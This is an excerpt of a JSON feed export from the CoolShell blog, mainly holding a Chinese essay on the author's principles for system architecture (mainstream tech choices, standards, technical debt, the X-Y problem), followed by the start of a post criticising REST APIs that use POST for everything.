src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg\" alt=\"黑客的价值观\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/2439.html\">黑客的价值观</a></li><li><a href=\"https://coolshell.cn/articles/1957.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg\" alt=\"Web程序的最佳测试数据\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1957.html\">Web程序的最佳测试数据</a></li><li><a href=\"https://coolshell.cn/articles/1331.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg\" alt=\"Unicode字符预览表\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1331.html\">Unicode字符预览表</a></li><li><a href=\"https://coolshell.cn/articles/1928.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg\" alt=\"如何使用Python操作摄像头\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1928.html\">如何使用Python操作摄像头</a></li><li><a href=\"https://coolshell.cn/articles/8460.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2012/11/go2-150x150.jpg\" alt=\"Go 语言简介（上）— 语法\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/8460.html\">Go 语言简介（上）— 语法</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21649.html\">源代码特洛伊木马攻击</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21672",
    "timestampUsec": "1657644531898533",
    "categories": [
        "程序设计",
        "系统架构",
        "Architecture",
        "Design",
        "程序员",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "我做系统架构的一些原则",
    "author": ";陈皓",
    "published": 1640072760,
    "updated": 1640072760,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21672.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png\" alt=\"\" width=\"250\" height=\"250\">工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）</p>\n<h4>原则一：关注于真正的收益而不是技术本身</h4>\n<p>对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：</p>\n<ul>\n<li><strong>是否可以降低技术门槛加快整个团队的开发流程</strong>。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）</li>\n<li><strong>是否可以让整个系统可以运行的更稳定</strong>。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《<a title=\"关于高可用的系统\" href=\"https://coolshell.cn/articles/17459.html\" target=\"_blank\" rel=\"noopener\">关于高可用的架构</a>》）</li>\n<li><strong>是否可以通过简化和自动化降低成本</strong>。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。</li>\n</ul>\n<p>如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。</p>\n<p><span></span></p>\n<h4>原则二：以应用服务和 API 为视角，而不是以资源和技术为视角</h4>\n<p>国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……</p>\n<p><strong>这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops</strong>。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——<strong>要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。</strong></p>\n<h4>原则三：选择最主流和成熟的技术</h4>\n<p>技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的  PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。</p>\n<ul>\n<li><strong>尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈</strong>。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。</li>\n<li><strong>选择全球流行的技术，而不是中国流行的技术</strong>。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。</li>\n<li><strong>尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改</strong>。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。</li>\n<li><strong>绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的</strong>。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的</li>\n</ul>\n<p>在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……</p>\n<p>注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……</p>\n<h4>原则四：完备性会比性能更重要</h4>\n<p>我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。</p>\n<p>所以，我给如下的一些如下的架构原则：</p>\n<ul>\n<li><strong>使用最科学严谨的技术模型为主，并以不严谨的模型作为补充</strong>。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。</li>\n<li><strong>性能上的东西，总是有很多解的</strong>。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。</li>\n</ul>\n<p>为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。</p>\n<h4>原则五：制定并遵循服从标准、规范和最佳实践</h4>\n<p>这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。<strong>有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？</strong></p>\n<p>还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。</p>\n<p>下面，我罗列一些你需要注意的标准和规范（包括但不限于）：</p>\n<ul>\n<li><strong>服务间调用的协议标准和规范</strong>。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。</li>\n<li><strong>一些命名的标准和规范</strong>。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等</li>\n<li><strong>日志和监控的规范</strong>。这其中包括：日志格式，监控数据，采样要求，报警……等等</li>\n<li><strong>配置上的规范</strong>。这其中包括：操作系统配置、中间件配置，软件包……等等</li>\n<li><strong>中间件使用的规范</strong>。数据库，缓存、消息队列……等等</li>\n<li><strong>软件和开发库版本统一</strong>。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。</li>\n</ul>\n<p>这里重要说一下两个事：</p>\n<ul>\n<li><strong>Restful API 的规范</strong>。我觉得是非常重要的，这里给两个我觉得写得最好的参考：<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal</a> 和 <a href=\"https://github.com/microsoft/api-guidelines\" target=\"_blank\" rel=\"noopener\">Microsoft</a> 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。</li>\n<li><strong>另一个是服务调用链追踪</strong>。对于服务调用链追踪来说，基本上都是参考于 <a href=\"https://research.google/pubs/pub36356/\" target=\"_blank\" rel=\"noopener\">Google Dapper</a> 这篇论文，目前有很多的实现，最严格的实现是 <a href=\"https://zipkin.io/\" target=\"_blank\" rel=\"noopener\">Zipkin</a>，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。</li>\n<li><strong>软件升级</strong>。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。</li>\n</ul>\n<h4>原则六：重视架构扩展性和可运维性</h4>\n<p>在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。</p>\n<ul>\n<li><strong>通过服务编排架构来降低服务间的耦合</strong>。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。</li>\n<li><strong>通过服务发现或服务网关来降低服务依赖所带来的运维复杂度</strong>。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。</li>\n<li><strong>一定要使用各种软件设计的原则</strong>。比如：像SOLID这样的原则（参看《<a title=\"一些软件设计的原则\" href=\"https://coolshell.cn/articles/4535.html\">一些软件设计的原则</a>》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《<a title=\"SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读\" href=\"https://coolshell.cn/articles/5701.html\" target=\"_blank\" rel=\"noopener\">SteveY对Amazon和Google平台的吐槽</a>》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《<a title=\"分布式系统的事务处理\" href=\"https://coolshell.cn/articles/10910.html\" target=\"_blank\" rel=\"noopener\">分布式系统的事务处理</a>》，或微软件的 《<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/\" target=\"_blank\" rel=\"noopener\">Cloud Design Patterns</a>》）……等等</li>\n</ul>\n<h4>原则七：对控制逻辑进行全面收口</h4>\n<p>所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：</p>\n<ul>\n<li><strong>流量收口</strong>。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。</li>\n<li><strong>服务治理收口</strong>。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK – 如：Spring Cloud，或服务网格Service Mesh等技术。</li>\n<li><strong>监控数据收口</strong>。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。</li>\n<li><strong>资源调度有应用部署的收口</strong>。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。</li>\n<li><strong>中间件的收口</strong>。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。</li>\n</ul>\n<p>对此，这里的原则是：</p>\n<ul>\n<li><strong>你要选择容易进行业务逻辑和控制逻辑分离的技术</strong>。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。</li>\n<li><strong>你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术</strong>。如：有庞大社区而且相互兼容的技术，如：Java, Docker,  Ansible，HTTP，Telegraf/Collectd……</li>\n<li><strong>中间件你要使用可以 支持HA集群和多租户的技术</strong>。这里基本上所有的主流中间件都会支持 HA 集群方式的。</li>\n</ul>\n<h4>原则八：不要迁就老旧系统的技术债务</h4>\n<p>我发现很多公司都很非常大的技术债务，这些债务具体表现如下：</p>\n<ul>\n<li><strong>使用老旧的技术</strong>。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等</li>\n<li><strong>不合理的设计</strong>。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等</li>\n<li> <strong>缺少配套设施</strong>。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等</li>\n</ul>\n<p>来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“<strong>如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……</strong>”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。</p>\n<p>他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……</p>\n<p>我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《<a href=\"https://coolshell.cn/articles/11656.html\" target=\"_blank\" rel=\"noopener\">开发团队的效率</a>》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）</p>\n<p>这里有几个原则和方法我是非常坚持的，分享给大家：</p>\n<ul>\n<li><strong>与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。</strong></li>\n<li><strong>建设没有技术债的“新城区”，并通过“<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer\" target=\"_blank\" rel=\"noopener\">防腐层</a> ”的架构模型，不要让技术债侵入“新城区”</strong>。</li>\n</ul>\n<h4>原则九：不要依赖自己的经验，要依赖于数据和学习</h4>\n<p>有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……</p>\n<p>另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。</p>\n<h4>原则十：千万要小心 X – Y 问题，要追问原始需求</h4>\n<p>对于 <a title=\"X-Y Problem\" href=\"https://coolshell.cn/articles/10804.html\">X-Y 问题</a>，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。</p>\n<p>比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。</p>\n<p>我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……</p>\n<h4>原则十一：激进胜于保守，创新与实用并不冲突</h4>\n<p>我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《<a title=\"Go语言、Docker 和新技术\" href=\"https://coolshell.cn/articles/18190.html\" target=\"_blank\" rel=\"noopener\">Go,Docker 和新技术</a> 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。</p>\n<p>有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。</p>\n<p>这里的逻辑很简单 —— <strong>进步永远来自于探索，探索是要付出代价的，但是收益更大</strong>。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/18024.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg\" alt=\"API设计原则 – Qt官网的设计实践总结\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/18024.html\">API设计原则 – Qt官网的设计实践总结</a></li><li><a href=\"https://coolshell.cn/articles/17680.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/02/gitlab-600-150x150.jpg\" alt=\"从Gitlab误删除数据库想到的\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/17680.html\">从Gitlab误删除数据库想到的</a></li><li><a href=\"https://coolshell.cn/articles/17459.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2016/08/HighAvailability-BK-150x150.png\" alt=\"关于高可用的系统\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/17459.html\">关于高可用的系统</a></li><li><a href=\"https://coolshell.cn/articles/9949.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg\" alt=\"IoC/DIP其实是一种管理思想\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/9949.html\">IoC/DIP其实是一种管理思想</a></li><li><a href=\"https://coolshell.cn/articles/6775.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"Bret Victor – Inventing on Principle\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/6775.html\">Bret Victor – Inventing on Principle</a></li><li><a href=\"https://coolshell.cn/articles/5686.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg\" alt=\"多些时间能少写些代码\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/5686.html\">多些时间能少写些代码</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21672.html\">我做系统架构的一些原则</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=22173",
    "timestampUsec": "1657644531898536",
    "categories": [
        "技术新闻",
        "程序设计",
        "HTTP",
        "Programmer",
        "Restful",
        "程序员",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "“一把梭：REST API 全用 POST”",
    "author": ";陈皓",
    "published": 1644726480,
    "updated": 1644726480,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/22173.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-300x169.png\" alt=\"\" width=\"325\" height=\"183\"></p>\n<p>写这篇文章的原因主要还是因为V2EX上的这个<a href=\"https://www.v2ex.com/t/830030?p=1\" target=\"_blank\" rel=\"noopener\">贴子</a>，这个贴子中说——</p>\n<blockquote><p>“对接同事的接口，他定义的所有接口都是 post 请求，理由是 https 用 post 更安全，之前习惯使用 restful api ，如果说 https 只有 post 请求是安全的话？那为啥还需要 get 、put 、delete ？我该如何反驳他。”</p></blockquote>\n<p>然后该贴中大量的回复大概有这么几种论调，1）POST挺好的，就应该这么干，沟通少，2）一把梭，早点干完早点回家，3）吵赢了又怎么样？工作而已，优雅不能当饭吃。虽然评论没有一边倒，但是也有大量的人支持。然后，我在Twitter上嘲讽了一下，用POST干一切就像看到了来你家装修工人说，“老子干活就是用钉子钉一切，什么螺丝、螺栓、卡扣、插销……通通不用，钉枪一把梭，方便，快捷，安全，干完早回家……不过，还是有一些网友觉得用POST挺好的，而且可以节约时间。所以，正好，我在《<a title=\"我做系统架构的一些原则\" href=\"https://coolshell.cn/articles/21672.html\" target=\"_blank\" rel=\"noopener\">我做系统架构的原则</a>》中的“<a href=\"https://coolshell.cn/articles/21672.html#%E5%8E%9F%E5%88%99%E4%BA%94%EF%BC%9A%E5%88%B6%E5%AE%9A%E5%B9%B6%E9%81%B5%E5%BE%AA%E6%9C%8D%E4%BB%8E%E6%A0%87%E5%87%86%E3%80%81%E8%A7%84%E8%8C%83%E5%92%8C%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5\" target=\"_blank\" rel=\"noopener\">原则五</a>”中反对API返回码无论对错全是200的返回那，我专门写下这一篇文章，以正视听。</p>\n<p>这篇文章主要分成下面这几个部分：</p>\n<ol>\n<li>为什么要用不同的HTTP动词？</li>\n<li>Restful 进行复杂查询</li>\n<li>几个主要问题的回应\n<ul>\n<li>POST 更安全吗？</li>\n<li>全用 POST 可以节省时间沟通少吗？</li>\n<li>早点回家的正确姿势</li>\n<li>工作而已，优雅不能当饭吃</li>\n</ul>\n</li>\n</ol>\n<p><span></span></p>\n<h4>为什么要用不同的HTTP动词</h4>\n<p>编程世界通常来说有两种逻辑：“<strong>业务逻辑</strong>” 和 